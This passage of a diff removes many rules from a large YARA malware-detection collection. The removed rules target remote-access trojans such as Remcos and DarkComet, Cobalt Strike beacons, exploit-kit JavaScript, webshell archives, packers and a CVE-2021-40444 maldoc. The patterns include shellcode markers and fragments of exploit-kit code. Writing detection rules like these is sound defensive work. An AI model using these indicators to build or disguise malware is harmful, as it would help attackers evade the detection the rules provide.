-    version   = "0.1"
-    date      = "1/29/2014"
-
-  strings:
-    $mz = "MZ"
-    $s1 = "%s\\admin$\\system32\\%s"
-    $s2 = "BeepService"
-    $s3 = "In ControlService"
-    $s4 = "In OpenScManager"
-    $s5 = "In CreateService"
-    $s6 = "Service is RUNNING"
-    $s7 = "Service is not running"
-    $s8 = "In DeleteService"
-    $s9 = "Remove the service OK"
-
-  condition:
-    ($mz at 0) and (all of ($s*))
-}
-
-rule html_CVE_2013_1347 {
-  meta:
-    author    = "@patrickrolsen"
-    reference = "http://blogs.cisco.com/security/watering-hole-attacks-target-energy-sector"
-    hashes    = "00ca490898740f9b6246e300ef0ee86f and dc681f380698b2e6dca7c49f699799ad"
-    date      = "02/01/2014"
-
-  strings:
-    $html = "html" wide ascii
-    $s1   = "DOropRAM" wide ascii
-    $s2   = "\\u9090\\u9090\\u9090\\u9090" wide ascii
-    $s3   = "shellcode" wide ascii
-    $s4   = "unicorn" wide ascii
-    $s5   = "helloWorld()" wide ascii
-    $s6   = "ANIMATECOLOR" wide ascii
-    $s7   = "UPXIgLvY" wide ascii
-
-  condition:
-    $html and 3 of ($s*)
 }
 
 rule APT20140414_1NT {
@@ -13853,22 +12073,6 @@ rule Tendrit_2014: OnePHP {
 
 }
 
-rule Remcos_RAT {
-  meta:
-    Description = "Deteccion del troyano Remcos"
-    Author      = "SadFud"
-    Date        = "08/08/2016"
-    Hash        = "f467114dd637c817b4c982fad55fe019"
-
-  strings:
-    $a = "REMCOS"
-    $b = "Remcos_Mutex"
-
-  condition:
-    $a or $b
-
-}
-
 rule Ripper_ATM {
   meta:
     Description = "RIPPER ATM MALWARE"
@@ -13989,54 +12193,6 @@ rule AcridRain {
 
   condition:
     ($mz at 0) and (3 of ($old_*) or 3 of ($new_*)) and (2 of ($zip_*)) and (2 of ($all_*))
-}
-
-rule DarkComet_Config_Artifacts_Memory {
-  meta:
-    Description = "Looks for configuration artifacts from DarkComet. Works with memory dump and unpacked samples."
-
-    filetype = "MemoryDump"
-
-    Author = "Ian Ahl @TekDefese"
-
-    Date = "12-19-2013"
-
-    reference = "http://www.tekdefense.com/news/2013/12/23/analyzing-darkcomet-in-memory.html"
-
-  strings:
-    $s0 = "GENCODE={" ascii
-
-    $s1 = "MELT={" ascii
-
-    $s2 = "COMBOPATH={" ascii
-
-    $s3 = "NETDATA={" ascii
-
-    $s4 = "PERSINST={" ascii
-
-  condition:
-    2 of them
-
-}
-
-rule DarkComet_Default_Mutex_Memory {
-  meta:
-    Description = "Looks for default DarkComet mutexs"
-
-    filetype = "MemoryDump"
-
-    Author = "Ian Ahl @TekDefese"
-
-    Date = "12-20-2013"
-
-    reference = "http://www.tekdefense.com/news/2013/12/23/analyzing-darkcomet-in-memory.html"
-
-  strings:
-    $s = "DC_MUTEX-" ascii nocase
-
-  condition:
-    any of them
-
 }
 
 rule eval_statement {
@@ -14356,17 +12512,6 @@ rule _aPack_v098b__Jibz_ {
     $0
 }
 
-rule _Metrowerks_CodeWarrior_DLL_v20_ {
-  meta:
-    description = "Metrowerks CodeWarrior (DLL) v2.0"
-
-  strings:
-    $0 = { 55 89 E5 53 56 57 8B 75 0C 8B 5D 10 83 FE 01 74 05 83 FE 02 75 12 53 56 FF 75 08 E8 6E FF FF FF 09 C0 75 04 31 C0 EB 21 53 56 FF 75 08 E8 ?? ?? ?? ?? 89 C7 09 F6 74 05 83 FE 03 75 0A 53 56 FF 75 08 E8 47 FF FF FF 89 F8 8D 65 F4 5F 5E 5B 5D C2 0C 00 C9 }
-
-  condition:
-    $0
-}
-
 rule _AntiDote_12Demo__SISTeam_ {
   meta:
     description = "AntiDote 1.2.Demo -> SIS-Team"
@@ -14417,17 +12562,6 @@ rule _RSCs_Process_Patcher_v14_ {
 
   strings:
     $0 = { E8 E1 01 00 00 80 38 22 75 13 80 38 00 74 2E 80 38 20 75 06 80 78 FF 22 74 18 40 EB ED 80 38 00 74 1B EB 19 40 80 78 FF 20 75 F9 80 38 00 74 0D EB 0B 40 80 38 00 74 05 80 38 22 74 00 8B F8 B8 04 60 40 00 68 00 20 40 00 C7 05 A2 20 40 00 44 00 00 00 68 92 }
-
-  condition:
-    $0
-}
-
-rule _DevCpp_v4_ {
-  meta:
-    description = "Dev-C++ v4"
-
-  strings:
-    $0 = { 55 89 E5 83 EC 08 83 C4 F4 6A ?? A1 ?? ?? ?? 00 FF D0 E8 ?? FF FF FF }
 
   condition:
     $0
@@ -14888,17 +13022,6 @@ rule _SPLayer_v008_ {
     $0
 }
 
-rule _NTkrnl_Secure_Suite_01015_DLL__NTkrnl_Software_ {
-  meta:
-    description = "NTkrnl Secure Suite 0.1-0.15 DLL -> NTkrnl Software"
-
-  strings:
-    $0 = { 00 00 00 00 00 00 00 00 00 00 00 00 34 10 00 00 28 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 4B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00 00 00 4C 6F 61 64 4C 69 62 72 61 72 79 41 00 00 00 47 65 74 50 72 6F 63 41 64 64 72 65 73 73 00 8B 44 24 04 05 ?? ?? ?? ?? 50 E8 01 00 00 00 C3 C3 }
-
-  condition:
-    $0
-}
-
 rule _Rpoly_crypt_by_Vaska_200307_1841_ {
   meta:
     description = "Rpoly crypt by Vaska (20.03.07 18:41)"
@@ -15156,17 +13279,6 @@ rule _SLVc0deProtector_060__SLV__ICU_ {
     $0
 }
 
-rule _UPXHiT_v001__DJ_Siba_ {
-  meta:
-    description = "UPX$HiT v0.0.1 -> DJ Siba"
-
-  strings:
-    $0 = { 94 BC ?? ?? ?? 00 B9 ?? 00 00 00 80 34 0C ?? E2 FA 94 FF E0 61 }
-
-  condition:
-    $0
-}
-
 rule _Enigma_Protector_11X13X__Sukhov_Vladimir__Serge_N_Markin_ {
   meta:
     description = "Enigma Protector 1.1X-1.3X -> Sukhov Vladimir & Serge N. Markin"
@@ -15332,17 +13444,6 @@ rule _VProtector_11A12__vcasm_ {
     $0
 }
 
-rule _NTkrnl_Secure_Suite_01015__NTkrnl_Software_ {
-  meta:
-    description = "NTkrnl Secure Suite 0.1-0.15 -> NTkrnl Software"
-
-  strings:
-    $0 = { 00 00 00 00 00 00 00 00 00 00 00 00 34 10 00 00 28 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 4B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00 00 00 4C 6F 61 64 4C 69 62 72 61 72 79 41 00 00 00 47 65 74 50 72 6F 63 41 64 64 72 65 73 73 00 68 ?? ?? ?? ?? E8 01 00 00 00 C3 C3 }
-
-  condition:
-    $0
-}
-
 rule _Setup2Go_Installer_Stub_ {
   meta:
     description = "Setup2Go Installer Stub"
@@ -15464,17 +13565,6 @@ rule _iPBProtect_v013_ {
     $0
 }
 
-rule _UPX_V194__Markus_Oberhumer__Laszlo_Molnar__John_Reiser_ {
-  meta:
-    description = "UPX V1.94 -> Markus Oberhumer & Laszlo Molnar & John Reiser"
-
-  strings:
-    $0 = { FF D5 80 A7 ?? ?? ?? ?? ?? 58 50 54 50 53 57 FF D5 58 61 8D 44 24 ?? 6A 00 39 C4 75 FA 83 EC 80 E9 }
-
-  condition:
-    $0
-}
-
 rule _Shrinker_32_ {
   meta:
     description = "Shrinker 3.2"
@@ -15586,17 +13676,6 @@ rule _Upack_v036_alpha__Dwing_ {
     $0
 }
 
-rule _UPXHiT_001__DJ_Siba_ {
-  meta:
-    description = "UPX$HiT 0.0.1 -> DJ Siba"
-
-  strings:
-    $0 = { E2 FA 94 FF E0 61 00 00 00 00 00 00 00 }
-
-  condition:
-    $0
-}
-
 rule _VIRUS__IWormHybris_ {
   meta:
     description = "VIRUS - I-Worm.Hybris"
@@ -15681,17 +13760,6 @@ rule _GPInstall_v50332_ {
 
   strings:
     $0 = { 55 8B EC 33 C9 51 51 51 51 51 51 51 53 56 57 B8 C4 1C 41 00 E8 6B 3E FF FF 33 C0 55 68 76 20 41 00 64 FF 30 64 89 20 BA A0 47 41 00 33 C0 E8 31 0A FF FF 33 D2 A1 A0 }
-
-  condition:
-    $0
-}
-
-rule _NTkrnl_Secure_Suite__NTkrnl_team_ {
-  meta:
-    description = "NTkrnl Secure Suite -> NTkrnl team"
-
-  strings:
-    $0 = { 34 10 00 00 28 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 41 10 00 00 50 10 00 00 00 00 00 00 4B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00 00 00 4C 6F 61 64 4C 69 62 72 61 72 79 41 00 00 00 47 65 74 50 72 6F 63 41 64 64 72 65 73 73 }
 
   condition:
     $0
@@ -15847,17 +13915,6 @@ rule _Themida_1201__Oreans_Technologies_ {
 
   strings:
     $0 = { 8B C5 8B D4 60 E8 00 00 00 00 5D 81 ED ?? ?? 35 09 89 95 ?? ?? 35 09 89 B5 ?? ?? 35 09 89 85 ?? ?? 35 09 83 BD ?? ?? 35 09 00 74 0C 8B E8 8B E2 B8 01 00 00 00 C2 0C 00 8B 44 24 24 89 85 ?? ?? 35 09 6A 45 E8 A3 00 00 00 68 9A 74 83 07 E8 DF 00 00 00 68 25 }
-
-  condition:
-    $0
-}
-
-rule _UPX_Inliner_v10_by_GPcH_ {
-  meta:
-    description = "UPX Inliner v1.0 by GPcH"
-
-  strings:
-    $0 = { 9C 60 E8 00 00 00 00 5D B8 B3 85 40 00 2D AC 85 40 00 2B E8 8D B5 D5 FE FF FF 8B 06 83 F8 00 74 11 8D B5 E1 FE FF FF 8B 06 83 F8 01 0F 84 F1 01 00 00 C7 06 01 00 00 00 8B D5 8B 85 B1 FE FF FF 2B D0 89 95 B1 FE FF FF 01 95 C9 FE FF FF 8D B5 E5 FE FF FF 01 }
 
   condition:
     $0
@@ -16023,17 +14080,6 @@ rule _TPAV_Cryptor_V11__msaha_dev__SignByfly_ {
 
   strings:
     $0 = { 8D 85 08 FF FF FF 50 8D 85 C4 FE FF FF 50 6A 00 6A 00 6A 04 6A 00 6A 00 6A 00 8D 95 C0 FE FF FF 33 C0 E8 ?? ?? FF FF 8B 85 C0 FE FF FF E8 ?? ?? FF FF 50 6A 00 FF 15 2C ?? ?? 70 }
-
-  condition:
-    $0
-}
-
-rule _NTkrnl_Secure_Suite__NTkrnl_team_h_ {
-  meta:
-    description = "NTkrnl Secure Suite -> NTkrnl team (h)"
-
-  strings:
-    $0 = { 34 10 00 00 28 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 41 10 00 00 50 10 00 00 00 00 00 00 4B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00 00 00 4C 6F 61 64 4C 69 62 72 61 72 79 41 00 00 00 47 65 74 50 72 6F 63 41 64 64 72 65 73 73 79 }
 
   condition:
     $0
@@ -16494,18 +14540,6 @@ rule Destructive_Target_Cleaning_Tool_2 {
     $secureWipe
 }
 
-rule Destructive_Target_Cleaning_Tool_5 {
-  meta:
-    author    = "US CERT"
-    reference = "https://www.us-cert.gov/ncas/alerts/TA14-353A"
-
-  strings:
-    $MCU_DLL_ZLIB_COMPRESSED2 = "{5CECABAE813CC9BCD5A542F454910428343479806F71D5521E2AOD}"
-
-  condition:
-    all of them
-}
-
 rule APT_malware_2 {
   meta:
     description = "rule detects malware"
@@ -16794,26 +14828,6 @@ rule CVE_2012_0158_3 {
     $a or ($b and $c and $d and $e and $f)
 }
 
-rule HKTL_CobaltStrike_Beacon_XOR_Strings {
-  meta:
-    author      = "Elastic"
-    description = "Identifies XOR'd strings used in Cobalt Strike Beacon DLL"
-    reference   = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
-    date        = "2021-03-16"
-    /* Used for beacon config decoding in THOR */
-    xor_s1      = "%02d/%02d/%02d %02d:%02d:%02d"
-    xor_s2      = "Started service %s on %s"
-    xor_s3      = "%s as %s\\%s: %d"
-
-  strings:
-    $s1 = "%02d/%02d/%02d %02d:%02d:%02d" xor(0x01-0xff)
-    $s2 = "Started service %s on %s" xor(0x01-0xff)
-    $s3 = "%s as %s\\%s: %d" xor(0x01-0xff)
-
-  condition:
-    2 of them
-}
-
 rule WEBSHELL_HAFNIUM_CISA_10328929_01: trojan webshell exploit CVE_2021_27065 {
   meta:
     author      = "CISA Code & Media Analysis"
@@ -16918,30 +14932,6 @@ rule TA18_074A_scripts {
 
   condition:
     filesize < 600KB and 2 of them
-}
-
-rule MAL_ZIP_SocGholish_Mar21_1: zip js socgholish {
-  meta:
-    description = "Triggers on small zip files with typical SocGholish JS files in it"
-    author      = "Nils Kuhnert"
-    date        = "2021-03-29"
-    hash        = "4f6566c145be5046b6be6a43c64d0acae38cada5eb49b2f73135b3ac3d6ba770"
-    hash        = "54f756fbf8c20c76af7c9f538ff861690800c622d1c9db26eb3afedc50835b09"
-    hash        = "dfdbec1846b74238ba3cfb8c7580c64a0fa8b14b6ed2b0e0e951cc6a9202dd8d"
-
-  strings:
-    $a1 = /\.[a-z0-9]{6}\.js/ ascii
-    $a2 = "Chrome" ascii
-    $a3 = "Opera" ascii
-
-    $b1 = "Firefox.js" ascii
-    $b2 = "Edge.js" ascii
-
-  condition:
-    uint16(0) == 0x4b50 and filesize > 1300 and filesize < 1600 and (
-      2 of ($a*) or
-      any of ($b*)
-    )
 }
 
 rule MAL_JS_SocGholish_Mar21_1: js socgholish {
@@ -17506,19 +15496,6 @@ rule BriefLzSig {
     ($a0)
 }
 
-rule DLLPackager: ReWolf {
-  meta:
-    author = "_pusher_"
-    date   = "2016-07"
-
-  strings:
-    //OEP Jump place
-    $c0 = { 85 C0 75 6A 8B 45 E8 8B 4D F0 03 48 10 89 4D D4 8B 45 D4 83 38 00 74 56 8B 45 D4 8B 4D F4 8B 00 3B 01 75 0D 8B 45 D4 8B 4D F4 8B 49 10 89 08 EB 32 8B 45 D4 8B 4D F4 8B 00 3B 41 04 75 0D 8B 45 D4 8B 4D F4 8B 49 0C 89 08 EB 18 8B 45 D4 8B 4D F4 8B 00 3B 41 18 75 0B 8B 45 D4 8B 4D F4 8B 49 14 89 08 8B 45 D4 83 C0 04 89 45 D4 EB A2 8B 45 E8 83 C0 14 89 45 E8 E9 ?? ?? ?? ?? 8B 45 F4 83 C0 2C FF 20 5E C9 C3 }
-
-  condition:
-    $c0
-}
-
 rule dUP2: diablo2oo2 {
   meta:
     author = "_pusher_"
@@ -17832,18 +15809,6 @@ rule Upack035alphaDwingmalw_no_good {
 
   strings:
     $a0 = { 8B F2 8B CA 03 4C 19 1C 03 54 1A 20 }
-
-  condition:
-    $a0
-}
-
-rule UPXLock: CyberDoom {
-  meta:
-    author = "_pusher_"
-    date   = "2015-11"
-
-  strings:
-    $a0 = { B2 ?? 8D B5 ?? ?? ?? ?? 8B FE B9 12 03 00 00 AC 32 C2 AA E2 FA C3 }
 
   condition:
     $a0
@@ -18228,34 +16193,6 @@ rule backdoor__1715ce0b {
     (uint16(0) == 0x3f3c and
       filesize < 300KB and
       (all of them)
-    ) or (all of them)
-}
-
-rule _home_hawk_infected_12_22_19_shell1_work1_34esd23 {
-  meta:
-    description = "work1 - file 34esd23.zip"
-    author      = "Brian Laskowski"
-    reference   = "https://github.com/Hestat/lw-yara/"
-    date        = "2019-12-22"
-    hash1       = "8862eefed0ef325212a49f8617a396a7ef3b6e5d05cddeda998dbf1ae834be91"
-
-  strings:
-    $s1  = "papkaa17/g336803.txt" fullword ascii
-    $s2  = "papkaa17/g757230.txt" fullword ascii
-    $s3  = "papkaa17/g554038.txt" fullword ascii
-    $s4  = "papkaa17/g864401.txt" fullword ascii
-    $s5  = "papkaa17/g380118.txt" fullword ascii
-    $s6  = "papkaa17/g200125.txt" fullword ascii
-    $s7  = "papkaa17/g365278.txt" fullword ascii
-    $s8  = "papkaa17/g895434.txt" fullword ascii
-    $s9  = "papkaa17/g554066.txt" fullword ascii
-    $s10 = "system.phpu" fullword ascii
-    $s11 = "system.phpPK" fullword ascii
-
-  condition:
-    (uint16(0) == 0x4b50 and
-      filesize < 200KB and
-      (8 of them)
     ) or (all of them)
 }
 
@@ -18811,69 +16748,6 @@ rule fire2013: webshell {
 
   condition:
     all of them
-}
-
-rule angler_js0: EK {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Angler Exploit Kit Detection"
-    hash0           = "482d6c24a824103f0bcd37fa59e19452"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "    2654435769,   Be"
-    $string1  = "DFOMIqka "
-    $string2  = ",  Zydr$>>16"
-    $string3  = "DFOMIqka( 'OPPj_phuPuiwzDFo')"
-    $string4  = "U0BNJWZ9J0vM43TnlNZcWnZjZSelQZlb1HGTTllZTm19emc0dlsYF13GvhQJmTZmbVMxallMdhWW948YWi t    P  b50GW"
-    $string5  = "    auSt;"
-    $string6  = " eval    (NDbMFR "
-    $string7  = "jWUwYDZhNVyMI2TzykEYjWk0MDM5MA%ZQ1TD1gEMzj         3  D       ',"
-    $string8  = "('fE').substr    (2    ,    1 "
-    $string9  = ",  -1 "
-    $string10 = "    )  );Zydr$  [ 1]"
-    $string11 = " 11;PsKnARPQuNNZMP<9;PsKnARPQuNNZMP"
-    $string12 = "new   Array  (2),  Ykz"
-    $string13 = "<script> "
-    $string14 = ");    CYxin "
-    $string15 = "Zydr$    [    1]"
-    $string16 = "var tKTGVbw,auSt, vnEihY, gftiUIdV, XnHs, UGlMHG, KWlqCKLfCV;"
-    $string17 = "reXKyQsob1reXKyQsob3 "
-
-  condition:
-    17 of them
-}
-
-rule fragus_js_vml0: EK {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Fragus Exploit Kit Detection"
-    hash0           = "8ab72337c815e0505fcfbc97686c3562"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = " 0x100000;"
-    $string1  = "            var gg "
-    $string2  = "/g, document.getElementById('divid').innerHTML));"
-    $string3  = "                                var sss "
-    $string4  = "                }"
-    $string5  = "                        document.body.appendChild(obj);"
-    $string6  = "                                var hbs "
-    $string7  = " shcode; }"
-    $string8  = " '<div id"
-    $string9  = " hbs - (shcode.length"
-    $string10 = "){ m[i] "
-    $string11 = " unescape(gg);"
-    $string12 = "                                var z "
-    $string13 = "                                var hb "
-    $string14 = " Math.ceil('0'"
-
-  condition:
-    14 of them
 }
 
 rule Backdoor_PHP_WPVCD_DivCodeName {
@@ -20073,164 +17947,6 @@ rule rlpack {
     $mz at 0 and $text1 in (0..1024) and $text2 in (0..1024)
 }
 
-rule AcidBox_SSP_DLL_Loader_Format_Strings {
-  meta:
-    description = "Detects AcidBox SSP DLL loaders, based on a combination of format strings"
-    author      = "BitsOfBinary"
-    reference   = "https://unit42.paloaltonetworks.com/acidbox-rare-malware/"
-    reference   = "https://bitsofbinary.github.io/yara/2023/03/19/100daysofyara-day-78.html"
-    hash        = "003669761229d3e1db0f5a5b333ef62b3dffcc8e27c821ce9018362e0a2df7e9"
-    version     = "1.0"
-    date        = "2023-03-19"
-    DaysofYARA  = "78/100"
-
-  strings:
-    $ = "%s\\%s"
-    $ = "%s\\%s{%s}"
-    $ = "s\\{%s}"
-
-  condition:
-    all of them
-}
-
-rule AcidBox_SSP_DLL_Loader_Format_String_Chunk {
-  meta:
-    description = "Detects AcidBox SSP DLL loaders, based on a unique string chunk of format strings"
-    author      = "BitsOfBinary"
-    reference   = "https://unit42.paloaltonetworks.com/acidbox-rare-malware/"
-    hash        = "003669761229d3e1db0f5a5b333ef62b3dffcc8e27c821ce9018362e0a2df7e9"
-    version     = "1.0"
-    date        = "2023-03-20"
-    DaysofYARA  = "79/100"
-
-  strings:
-    // %s\%s
-    // %s\%s{%s}
-    // s\{%s}
-    $ = { 25 73 5C 25 73 00 00 00 00 00 00 00 25 73 5C 25 73 7B 25 73 7D 00 00 00 00 00 00 00 25 73 5C 7B 25 73 7D 00 }
-
-  condition:
-    any of them
-}
-
-rule AcidBox_SSP_DLL_Loader_Format_String_Combos {
-  meta:
-    description = "Detects AcidBox SSP DLL loaders, based on combinations of format strings seen in samples"
-    author      = "BitsOfBinary"
-    reference   = "https://unit42.paloaltonetworks.com/acidbox-rare-malware/"
-    reference   = "https://bitsofbinary.github.io/yara/2023/03/21/100daysofyara-day-80.html"
-    hash        = "003669761229d3e1db0f5a5b333ef62b3dffcc8e27c821ce9018362e0a2df7e9"
-    version     = "1.0"
-    date        = "2023-03-21"
-    DaysofYARA  = "80/100"
-
-  strings:
-    // Combinations of the following (with alignment bytes):
-    // %s\%s
-    // %s\%s{%s}
-    // s\{%s}
-    $ = { 25 73 5C 25 73 00 00 00 00 00 00 00 25 73 5C 25 73 7B 25 73 7D 00 }
-    $ = { 25 73 5C 25 73 00 00 00 00 00 00 00 25 73 5C 7B 25 73 7D 00 }
-    $ = { 25 73 5C 25 73 7B 25 73 7D 00 00 00 00 00 00 00 25 73 5C 25 73 00 }
-    $ = { 25 73 5C 25 73 7B 25 73 7D 00 00 00 00 00 00 00 25 73 5C 7B 25 73 7D 00 }
-    $ = { 25 73 5C 7B 25 73 7D 00 00 00 00 00 00 00 25 73 5C 25 73 00 }
-    $ = { 25 73 5C 7B 25 73 7D 00 00 00 00 00 00 00 25 73 5C 25 73 7B 25 73 7D 00 }
-
-  condition:
-    any of them
-}
-
-rule AcidBox_SSP_DLL_Loader_Unique_Exports_Strings {
-  meta:
-    description = "Detects the strings of unique exported functions of AcidBox SSP DLL loaders"
-    author      = "BitsOfBinary"
-    reference   = "https://unit42.paloaltonetworks.com/acidbox-rare-malware/"
-    reference   = "https://bitsofbinary.github.io/yara/2023/03/26/100daysofyara-day-85.html"
-    hash        = "003669761229d3e1db0f5a5b333ef62b3dffcc8e27c821ce9018362e0a2df7e9"
-    version     = "1.0"
-    date        = "2023-03-26"
-    DaysofYARA  = "85/100"
-
-  strings:
-    $ = "InitPhysicalInterfaceA"
-    $ = "UpdateSecurityContext"
-
-  condition:
-    any of them
-}
-
-rule AcidBox_SSP_DLL_Loader_Crypto_Routine_A {
-  meta:
-    description = "Detects AcidBox SSP DLL loaders, based on a unique cryptography routine"
-    author      = "BitsOfBinary"
-    reference   = "https://unit42.paloaltonetworks.com/acidbox-rare-malware/"
-    reference   = "https://bitsofbinary.github.io/yara/2023/03/28/100daysofyara-day-87.html"
-    hash        = "003669761229d3e1db0f5a5b333ef62b3dffcc8e27c821ce9018362e0a2df7e9"
-    version     = "1.0"
-    date        = "2023-03-28"
-    DaysofYARA  = "87/100"
-
-  strings:
-    // 180013a71 0f  b6  04  32   MOVZX      EAX ,byte ptr [param_2  + RSI *0x1 ]
-    // 180013a75 33  c8           XOR        param_1 ,EAX
-    // 180013a77 88  0c  3a       MOV        byte ptr [param_2  + RDI *0x1 ],param_1
-    // 180013a7a 41  ff  c0       INC        param_3
-    // 180013a7d 44  89  44       MOV        dword ptr [RSP  + local_14 ],param_3
-    //           24  04
-    $ = { 0f b6 04 32 33 c8 88 0c 3a 41 ff c0 44 89 44 24 04 }
-
-  condition:
-    any of them
-}
-
-rule AcidBox_SSP_DLL_Loader_Crypto_Routine_B {
-  meta:
-    description = "Detects AcidBox SSP DLL loaders, based on a unique cryptography routine"
-    author      = "BitsOfBinary"
-    reference   = "https://unit42.paloaltonetworks.com/acidbox-rare-malware/"
-    reference   = "https://bitsofbinary.github.io/yara/2023/03/29/100daysofyara-day-88.html"
-    hash        = "003669761229d3e1db0f5a5b333ef62b3dffcc8e27c821ce9018362e0a2df7e9"
-    version     = "1.0"
-    date        = "2023-03-29"
-    DaysofYARA  = "88/100"
-
-  strings:
-    // 180013a71 0f  b6  04  32   MOVZX      EAX ,byte ptr [param_2  + RSI *0x1 ]
-    // 180013a75 33  c8           XOR        param_1 ,EAX
-    // 180013a77 88  0c  3a       MOV        byte ptr [param_2  + RDI *0x1 ],param_1
-    // 180013a7a 41  ff  c0       INC        param_3
-    // 180013a7d 44  89  44       MOV        dword ptr [RSP  + local_14 ],param_3
-    //           24  04
-    $ = { 0f b6 04 32 33 c8 88 0c 3a 4? ff c0 4? 89 44 ?4 04 }
-
-  condition:
-    any of them
-}
-
-rule AcidBox_SSP_DLL_Loader_Crypto_Routine_C {
-  meta:
-    description = "Detects AcidBox SSP DLL loaders, based on a unique cryptography routine"
-    author      = "BitsOfBinary"
-    reference   = "https://unit42.paloaltonetworks.com/acidbox-rare-malware/"
-    reference   = "https://bitsofbinary.github.io/yara/2023/03/30/100daysofyara-day-89.html"
-    hash        = "003669761229d3e1db0f5a5b333ef62b3dffcc8e27c821ce9018362e0a2df7e9"
-    version     = "1.0"
-    date        = "2023-03-30"
-    DaysofYARA  = "89/100"
-
-  strings:
-    // 180013a71 0f  b6  04  32   MOVZX      EAX ,byte ptr [param_2  + RSI *0x1 ]
-    // 180013a75 33  c8           XOR        param_1 ,EAX
-    // 180013a77 88  0c  3a       MOV        byte ptr [param_2  + RDI *0x1 ],param_1
-    // 180013a7a 41  ff  c0       INC        param_3
-    // 180013a7d 44  89  44       MOV        dword ptr [RSP  + local_14 ],param_3
-    //           24  04
-    $ = { 0f b6 04 32 33 c8 88 0c 3a 4? ff c? 4? 89 }
-
-  condition:
-    any of them
-}
-
 rule Heuristic_Stack_String_SeLoadDriverPrivilege_A {
   meta:
     description = "Detects the stack string SeLoadDriverPrivilege being loaded in a combination of 1, 2, and 4 byte chunks, not necessarily in order"
@@ -20463,32 +18179,6 @@ rule APT_EQGRP_SUCTIONCHAR_BVP47_1 {
   condition:
     uint32(0) == 0x464c457f
     and all of them
-}
-
-rule HUNT_ELF_FREEBSD_RUST_KERNEL_MODULE_1 {
-  meta:
-    author      = "@qutluch@infosec.exchange"
-    description = "Rule to surface FreeBSD kernel modules built with Rust."
-    reference   = "https://research.nccgroup.com/2022/08/31/writing-freebsd-kernel-modules-in-rust/"
-    DaysofYARA  = "29/100"
-    license     = "BSD-2-Clause"
-    date        = "2024-01-31"
-    version     = "1.0"
-
-  strings:
-    // Thanks to captainGeech42 for his Rust rule.
-    // https://github.com/100DaysofYARA/2024/pull/23/commits/2332616aeaca4651b1c8ad064f9f60a9a9b9e8d9
-    $rust1 = "/rustc/"
-    $rust2 = "/library/core/src/"
-    $rust3 = "/library/std/src/"
-    $rust4 = "/rust/deps"
-    $f1    = "module_register_init"
-
-  condition:
-    uint32(0) == 0x464c457f
-    and uint16(0x7) == 0x9
-    and (#rust1 + #rust2 + #rust3 + #rust4) > 15
-    and $f1
 }
 
 private rule IsOLE: OLE {
@@ -22885,37 +20575,6 @@ rule TRELLIX_ARC_Cryptolocker_Rule2: RANSOMWARE {
     12 of ($string*)
 }
 
-rule ARKBIRD_SOLG_Exp_CVE_2021_40444_Sep_2021_1: FILE {
-  meta:
-    description = "Detect the maldocs with a structure like used for CVE_2021_40444 exploit"
-    author      = "Arkbird_SOLG"
-    id          = "acaba73d-f744-5d3f-9617-e976832f3577"
-    date        = "2021-09-09"
-    modified    = "2021-09-09"
-    reference   = "https://github.com/StrangerealIntel/DailyIOC"
-    source_url  = "https://github.com/StrangerealIntel/DailyIOC/blob/a873ff1298c43705e9c67286f3014f4300dd04f7/2021-09-09/Exp_CVE_2021_40444_Sep_2021_1.yara#L2-L20"
-    license_url = "N/A"
-    logic_hash  = "ba1b256c9caad3371d57e6ecbe54721038c819c7c081edf2443523109c25b184"
-    score       = 50
-    quality     = 75
-    tags        = "FILE"
-    reference1  = "-"
-    hash1       = "199b9e9a7533431731fbb08ff19d437de1de6533f3ebbffc1e13eeffaa4fd455"
-    hash2       = "3bddb2e1a85a9e06b9f9021ad301fdcde33e197225ae1676b8c6d0b416193ecf"
-    hash3       = "5b85dbe49b8bc1e65e01414a0508329dc41dc13c92c08a4f14c71e3044b06185"
-    hash4       = "938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52"
-    tlp         = "White"
-    level       = "experimental"
-    adversary   = "-"
-
-  strings:
-    $x1 = { 2f 5f 72 65 6c 73 2f 64 6f 63 75 6d 65 6e 74 2e 78 6d 6c 2e 72 65 6c 73 55 54 09 00 03 [3] 61 [3] 61 75 78 0b 00 01 04 00 00 00 00 04 00 00 00 00 ?? 94 ?? 4e c2 [3] ef 4d 7c 87 }
-    $x2 = { 77 6d 66 55 54 09 00 03 00 a6 ce 12 00 a6 ce 12 75 78 0b 00 01 04 00 00 00 00 04 00 00 00 00 bb 7e f6 d8 2c 06 38 48 00 93 85 e1 8c 0c 9c 0c 0c cc 52 60 1e 2b 98 64 01 62 66 46 0e 30 8f 9b 09 26 ce 03 66 31 83 55 00 00 50 4b 03 04 ?? 00 00 00 ?? 00 [10] 00 00 [2] 00 00 ?? 00 1c 00 }
-
-  condition:
-    uint16(0) == 0x4B50 and filesize > 5KB and all of ($x*)
-}
-
 rule ARKBIRD_SOLG_APT_Evilnum_JS_Jul_2021_1: FILE {
   meta:
     description = "Detect JS script used by EvilNum group"
@@ -24134,92 +21793,6 @@ rule JPCERTCC_Nanocore {
     all of them
 }
 
-rule JPCERTCC_Formbook_1 {
-  meta:
-    description = "detect Formbook in memory"
-    author      = "JPCERT/CC Incident Response Group"
-    id          = "71291f9b-eb8e-55e5-a499-df54c35efdbf"
-    date        = "2021-08-16"
-    modified    = "2021-08-16"
-    reference   = "internal research"
-    source_url  = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L384-L397"
